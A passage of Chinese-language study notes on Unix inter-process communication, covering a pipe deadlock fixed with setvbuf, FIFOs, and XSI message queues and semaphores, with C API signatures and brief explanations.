c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 1024</span><br><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> int1, int2;<br>    <span class="hljs-type">char</span> line[MAXLINE];<br><br>    <span class="hljs-keyword">while</span> (fgets(line, MAXLINE, <span class="hljs-built_in">stdin</span>) != <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">&quot;%d%d&quot;</span>, &amp;int1, &amp;int2) == <span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, int1 + int2) == EOF)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;printf error!\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;invalid args\n&quot;</span>) == EOF)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;printf error&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>采用fgets函数从标准输入流中读取数据，由于标准输入流指向管道，因此在Linux下会默认为全缓冲，那么调用fgets函数时会进行阻塞，等到管道中的数据被填充满时才进行数据的读取，在父进程中同样通过fgets函数进行数据读取，同样为全缓冲，那么造成父进程也在等到管道中的数据被填满后才读取数据，导致了父子进程互相等待的局面，从而导致了死锁</strong></p><p><strong>改进方法，将标准输入输出流修改为行缓冲或无缓冲模式</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 1024</span><br><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> int1, int2;<br>    <span class="hljs-type">char</span> line[MAXLINE];<br>    <span class="hljs-comment">/*无缓冲</span><br><span class="hljs-comment">if (setvbuf(stdin, NULL, _IONBF, 0) != 0)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">        fprintf(stderr, &quot;setvbuf error\n&quot;);</span><br><span class="hljs-comment">        exit(-1);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">if (setvbuf(stdout, NULL, _IONBF, 0) != 0)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">        fprintf(stderr, &quot;setvbuf error\n&quot;);</span><br><span class="hljs-comment">        ex</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">//行缓冲</span><br><span class="hljs-keyword">if</span> (setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>, _IOLBF, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>)<br>&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;setvbuf error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><span class="hljs-keyword">if</span> (setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IOLBF, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>)<br>&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;setvbuf error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">while</span> (fgets(line, MAXLINE, <span class="hljs-built_in">stdin</span>) != <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">&quot;%d%d&quot;</span>, &amp;int1, &amp;int2) == <span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, int1 + int2) == EOF)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;printf error!\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;invalid args\n&quot;</span>) == EOF)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;printf error&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="FIFOs"><a href="#FIFOs" class="headerlink" title="FIFOs"></a>FIFOs</h2><p><code>FIFOs</code>有时也被称之为命名管道。未命名管道只能是相关的进程间进行数据交互，即由共同祖先创造的子进程之间。但是命名管道可以使得不相关的进程之间也交换数据。</p><p><strong>创建FIFO文件</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mkfifo</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">mode_t</span> mode)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">mkfifoat</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">mode_t</span> mode)</span>;<br>Both <span class="hljs-keyword">return</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><ul><li>如果<code>path</code>为绝对路径，则忽略<code>fd</code>参数，此时<code>mkfifoat</code>与<code>mkfifo</code>行为类似</li><li><code>path</code>如果为相对路径，并且<code>fd</code>指向合法的被打开的目录文件描述符，那么<code>path</code>则相对于<code>fd</code>指向目录进行寻址</li><li>如果<code>fd</code>的值为<code>AT_FDCWD</code>，那么<code>path</code>则相对于当前目录进行寻址</li></ul><p><code>O_NONBLOCK</code>标志会影响<code>FIFO</code>文件的行为</p><ul><li>如果为设置该标志，那么以只读方式打开<code>FIFO</code>文件会进行阻塞直到有以只写方式打开<code>FIFO</code>文件的进程出现，相反以只写方式打开<code>FIFO</code>文件的进程也会等到只读形式打开<code>FIFO</code>文件的进程出现。</li></ul><p><code>FIFOs</code>可以用于以下两个场景</p><ul><li><code>FIFOs</code>被用于<code>shell</code>从一个管道传递数据给另一个，并且不需要创建中间的临时文件</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkfifo fifo1<br>prog3 &lt; fifo1 &amp;<br>prog1 &lt; infile | tee fifo1 | prog2<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230211000205461.png" alt="image-20230211000205461"></p><ul><li><code>FIFOs</code>被用于客户-服务应用程序中传递数据的中间集合点</li></ul><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230211003608390.png" alt="image-20230211003608390"></p><p><strong>客户</strong>经过<code>FIFO</code>发送请求给<strong>服务</strong>，并且<code>FIFO</code>的路径是所有客户都知道的。</p><p>但是为了使得服务能够给每个客户发送回应包，客户在给服务发送请求包时需要携带自己的进程号，便于让服务识别。当客户关闭<code>FIFO</code>时会给服务发送<code>SIGPIPE</code>的信号，因此服务必须处理该信号。</p><h2 id="XSI-IPC"><a href="#XSI-IPC" class="headerlink" title="XSI IPC"></a>XSI IPC</h2><p>有三种类型的进程间通信被称之为<code>XSI IPC</code></p><ul><li>信息队列</li><li>信号量</li><li>共享队列</li></ul><h3 id="Identifiers与Keys"><a href="#Identifiers与Keys" class="headerlink" title="Identifiers与Keys"></a>Identifiers与Keys</h3><p><code>Identifiers</code>用于内核空间使用，用于标记<code>IPC</code>对象</p><p><code>Keys</code>用于用户空间使用</p><p>有许多方法可以使得服务与客户使用相同的<code>IPC</code>结构</p><ul><li>使用<code>IPC_PRIVATE</code>的键值新建<code>IPC</code>的结构，并且会返回<code>identifiers</code>给客户，但是该方法的缺陷为客户需要利用文件操作去读取<code>identifiers</code></li><li>服务与客户使用相同的键值，但是该方法的问题是键值可能已经被使用</li><li>服务与客户通过文件名与对象<code>ID</code>生成键值，然后使用上述第二个方法。</li></ul><p><strong>通过路径与id值生成键</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><br><span class="hljs-type">key_t</span> <span class="hljs-title function_">ftok</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">int</span> id)</span>;<br><br>Returns:key <span class="hljs-keyword">if</span> OK, (<span class="hljs-type">key_t</span>)<span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><h3 id="Permission-Structure"><a href="#Permission-Structure" class="headerlink" title="Permission Structure"></a>Permission Structure</h3><p><code>ipc_perm</code>结构与每个<code>IPC</code>相关联的。这个结构定义了权限和拥有者。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_perm</span> &#123;</span><br><span class="hljs-type">uid_t</span> uid; <span class="hljs-comment">/* owner’s effective user ID */</span><br><span class="hljs-type">gid_t</span> gid; <span class="hljs-comment">/* owner’s effective group ID */</span><br><span class="hljs-type">uid_t</span> cuid; <span class="hljs-comment">/* creator’s effective user ID */</span><br><span class="hljs-type">gid_t</span> cgid; <span class="hljs-comment">/* creator’s effective group ID */</span><br><span class="hljs-type">mode_t</span> mode; <span class="hljs-comment">/* access modes */</span><br>...<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h2><p>消息队列是存储在内核中并被链表链接的信息，通过<code>identified</code>识别队列，也称之为<code>queue ID</code></p><p>消息队列相关的结构体<code>msqid_ds</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msqid_ds</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_perm</span> <span class="hljs-title">msg_perm</span>;</span> <span class="hljs-comment">/* see Section 15.6.2 */</span><br><span class="hljs-type">msgqnum_t</span> msg_qnum; <span class="hljs-comment">/* # of messages on queue */</span><br><span class="hljs-type">msglen_t</span> msg_qbytes; <span class="hljs-comment">/* max # of bytes on queue */</span><br><span class="hljs-type">pid_t</span> msg_lspid; <span class="hljs-comment">/* pid of last msgsnd() */</span><br><span class="hljs-type">pid_t</span> msg_lrpid; <span class="hljs-comment">/* pid of last msgrcv() */</span><br><span class="hljs-type">time_t</span> msg_stime; <span class="hljs-comment">/* last-msgsnd() time */</span><br><span class="hljs-type">time_t</span> msg_rtime; <span class="hljs-comment">/* last-msgrcv() time */</span><br><span class="hljs-type">time_t</span> msg_ctime; <span class="hljs-comment">/* last-change time */</span><br>...<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="msgget"><a href="#msgget" class="headerlink" title="msgget"></a>msgget</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">msgget</span><span class="hljs-params">(<span class="hljs-type">key_t</span> key, <span class="hljs-type">int</span> flag)</span>;<br>Returns:meessage <span class="hljs-built_in">queue</span> ID <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><p>当队列被创建完毕后，<code>msqid_ds</code>的成员会进行初始化</p><ul><li><code>ipc_perm</code>结构体将被初始化，并且权限相关的标志位将会被设置。</li><li><code>msg_qnum</code>、<code>msg_lspid</code>、<code>msg_stime</code>和<code>msg_rtime</code>被设置为0</li><li><code>msg_ctime</code>被设置为当前时间</li><li><code>msg_qbytes</code>被设置为系统的限制</li></ul><h3 id="msgctl"><a href="#msgctl" class="headerlink" title="msgctl"></a>msgctl</h3><p>针对消息队列执行操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">msgctl</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">int</span> cmd, <span class="hljs-keyword">struct</span> msqid_ds *buf)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>IPC_STAT</code>：获取<code>msqid_ds</code>结构体信息</li><li><code>IPC_SET</code>：将<code>buf</code>指向的<code>msg_perm.uid</code>、<code>msg_perm.gid</code>、<code>msg_prerm.mode</code>和<code>msg_gbytes</code>拷贝到与消息队列相关的<code>msqid_ds</code>结构</li><li><code>IPC_RMID</code>：从系统中删除消息队列以及队列中所有数据</li></ul><h3 id="msgsnd"><a href="#msgsnd" class="headerlink" title="msgsnd"></a>msgsnd</h3><p>将数据放入消息队列中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">msgnd</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> nbytes, <span class="hljs-type">int</span> flag)</span>;<br></code></pre></td></tr></table></figure><p>如果发送的最大数据为512字节，则可以使用下面的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mymesg</span>&#123;</span><br><span class="hljs-type">long</span> mtype; <span class="hljs-comment">//消息类型</span><br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">512</span>]; <span class="hljs-comment">//消息数据，长度为n字节</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="msgrcv"><a href="#msgrcv" class="headerlink" title="msgrcv"></a>msgrcv</h3><p>检索消息队列中的消息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">msgrcv</span><span class="hljs-params">(<span class="hljs-type">int</span> msgid, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> nbytes, <span class="hljs-type">long</span> type, <span class="hljs-type">int</span> flag)</span>;<br><br>Returns:size of data portion of message <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><p><code>type</code>参数指定需要返回哪个参数</p><ul><li><code>type == 0</code>：队列中的第一个消息返回</li><li><code>type &gt; 0</code>：返回与<code>type</code>一致的消息</li><li><code>type &lt; 0</code>：第一个小于或等于<code>type</code>绝对值的消息</li></ul><h2 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h2><p>为了获得共享资源，进程需要做以下操作</p><ul><li>测试控制资源的信号量</li><li>如果信号量的值是正数，则进程获得该资源，并且把信号量的值减去一</li><li>如果信号量的值为0，则进程需要休眠等待直到信号量的的值大于一，当进程被唤醒，重复操作一</li></ul><p><strong>信号量结构体semid_ds</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">semid_ds</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_perm</span> <span class="hljs-title">sem_perm</span>;</span> <span class="hljs-comment">/* see Section 15.6.2 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> sem_nsems; <span class="hljs-comment">/* # of semaphores in set */</span><br><span class="hljs-type">time_t</span> sem_otime; <span class="hljs-comment">/* last-semop() time */</span><br><span class="hljs-type">time_t</span> sem_ctime; <span class="hljs-comment">/* last-change time */</span><br>...<br>&#125;;<br></code></pre></td></tr></table></figure><p>每个信号量由至少包含以下成员的匿名结构表示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> semval; <span class="hljs-comment">/* semaphore value, always &gt;= 0 */</span><br><span class="hljs-type">pid_t</span> sempid; <span class="hljs-comment">/* pid for last operation */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> semncnt; <span class="hljs-comment">/* # processes awaiting semval&gt;curval */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> semzcnt; <span class="hljs-comment">/* # processes awaiting semval==0 */</span><br>...<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="semget"><a href="#semget" class="headerlink" title="semget"></a>semget</h3><p><strong>获取信号量的id值</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">semget</span><span class="hljs-params">(<span class="hljs-type">key_t</span> key, <span class="hljs-type">int</span> nsems, <span class="hljs-type">int</span> flag)</span>;<br>Returns:semaphore ID <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><h3 id="semctl"><a href="#semctl" class="headerlink" title="semctl"></a>semctl</h3><p><strong>操作信号量</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">semctl</span><span class="hljs-params">(<span class="hljs-type">int</span> semid, <span class="hljs-type">int</span> semnum, <span class="hljs-type">int</span> cmd, ...)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Returns:(see following)</span><br><span class="hljs-comment">For all the GET commands other than GETALL, the function returns the corresponding</span><br><span class="hljs-comment">value. For the remaining commands, the return value is 0 if the call succeeds. On error,</span><br><span class="hljs-comment">the semctl function sets errno and returns −1</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p><strong>第四个为可选参数，若存在则为senum类型</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">semun</span> &#123;</span><br><span class="hljs-type">int</span> val; <span class="hljs-comment">/* for SETVAL */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">semid_ds</span> *<span class="hljs-title">buf</span>;</span> <span class="hljs-comment">/* for IPC_STAT and IPC_SET */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *<span class="hljs-built_in">array</span>; <span class="hljs-comment">/* for GETALL and SETALL */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>cmd</code>为执行的命令，命令选择如下</p><ul><li><p><code>IPC_STAT</code>：获取此集合的<code>semid_ds</code>结构，将其存储在<code>arg.buf</code>指向的结构中。</p></li><li><p><code>IPC_SET</code>：从与此集关联的<code>semid_ds</code>结构中<code>arg.buf</code>指向的结构中设置<code>sem_perm.uid</code>、<code>sem_perm.gid</code>和<code>sem_perm.mode</code>字段。此命令只能由有效用户ID等于<code>sem_perm.cuid</code>或<code>sem_perm.uid</code>的进程或具有超级用户权限的进程执行</p></li><li><p><code>IPC_RMID</code>：从系统中删除信号量集。此删除是立即的。任何其他仍在使用该信号量的进程在其下一次尝试对该信号量进行操作时都会收到<code>EIDRM</code>错误。</p><p>此命令只能由有效用户<code>ID</code>等于<code>sem_perm.cuid</code>或<code>sem_perm.uid</code>的进程或具有超级用户权限的进程执行。</p></li><li><p><code>GETVAL</code>：返回成员<code>semnum</code>的<code>semval</code>值</p></li><li><p><code>SETVAL</code>：设置成员<code>semnum</code>的<code>semval</code>值。该值由<code>arg.val</code>指定</p></li><li><p><code>GETPID</code>：返回成员<code>semnum</code>的<code>sempid</code>值</p></li><li><p><code>GETNCNT</code>：返回成员<code>semnum</code>的<code>semncnt</code>值</p></li><li><p><code>GETZCNT</code>：返回成员<code>semnum</code>的<code>semzcnt</code>值</p></li><li><p><code>GETALL</code>：获取集合中的所有信号量值。这些值存储在<code>arg.array</code>指向的数组中</p></li><li><p><code>SETALL</code>：将集合中的所有信号量值设置为<code>arg.array</code>指向的值</p></li></ul><h3 id="semop"><a href="#semop" class="headerlink" title="semop"></a>semop</h3><p><strong>原子地对信号集执行一系列操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">semop</span><span class="hljs-params">(<span class="hljs-type">int</span> semid, <span class="hljs-keyword">struct</span> sembuf semoparray[], <span class="hljs-type">size_t</span> nops)</span>;<br>Returns: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, −<span class="hljs-number">1</span> on error<br></code></pre></td></tr></table></figure><p><code>semoparray</code>参数是指向信号量操作数组的指针，由<code>sembuf</code>结构表示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> sem_num; <span class="hljs-comment">/* member # in set (0, 1, ..., nsems-1) */</span><br><span class="hljs-type">short</span> sem_op; <span class="hljs-comment">/* operation (negative, 0, or positive) */</span><br><span class="hljs-type">short</span> sem_flg; <span class="hljs-comment">/* IPC_NOWAIT, SEM_UNDO */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>结构体<code>sembuf</code>中地<code>sem_op</code>变量定义了对信号集的操作</p><ul><li><code>sem_op</code>为正值，则对应的进程归还资源。<code>sem_op</code>的值被加到信号量的值上。如果指定<code>undo</code>标志，则还将该进程的信号量调整值减去<code>sem_op</code></li><li><code>sem_op</code>为负值，希望获得信号量控制的资源。则从信号量值中减去<code>sem_op</code>绝对值。这保证了生成的信号量值大于或等于0。如果指定了<code>undo</code>标志，则<code>sem_op</code>的绝对值也会添加到此进程的信号量调整值中。<ul><li>如果信号量的值小于<code>sem_op</code>的绝对值，则以下条件使用<ul><li>指定了<code>IPC_NOWAIT</code>，则<code>semop</code>返回错误<code>EAGAIN</code></li><li>未指定<code>IPC_NOWAIT</code>，则信号量的<code>semncnt</code>值递增，并且调用过程暂停，直到出现以下情况<ul><li>信号量的值大于或等于<code>sem_op</code>的绝对值，此时信号量的<code>semncnt</code>值减少，并且从信号量的值中减去<code>sem_op</code>的绝对值。如果指定了<code>undo</code>标志，则<code>sem_op</code>的绝对值也会添加到此进程的信号量调整值中。</li><li>信号量从系统中被移除。函数返回<code>EIDRM</code></li><li>信号被捕捉，信号量中的<code>semncnt</code>值递减，并且函数返回<code>EINTR</code></li></ul></li></ul></li></ul></li><li><code>sem_op</code>值为0，代表进程需要等待直到信号量的值为0<ul><li>如果信号量的值当前为0，则函数立即返回</li><li>如果信号量的值是非零，则发生以下的情况<ul><li>如果<code>IPC_NOWAIT</code>被指定，则<code>error</code>被标记为<code>EAGIN</code></li><li>如果<code>IPC_NOWAIT</code>被指定，则<code>semzcnt</code>的值递增，并且调用进程悬挂直到以下的情况发生<ul><li>信号量的值变为0。信号量的<code>semzcnt</code>递减</li><li>信号量从系统中被移除。函数返回并将<code>error</code>设置为<code>EIDRM</code></li><li>信号被捕捉。信号量的<code>semzcnt</code>递减，并且函数返回并将<code>error</code>设置为<code>EINTR</code></li></ul></li></ul></li></ul></li></ul><h2 id="共享内存"><a href="#共享内存" class="headerlink" 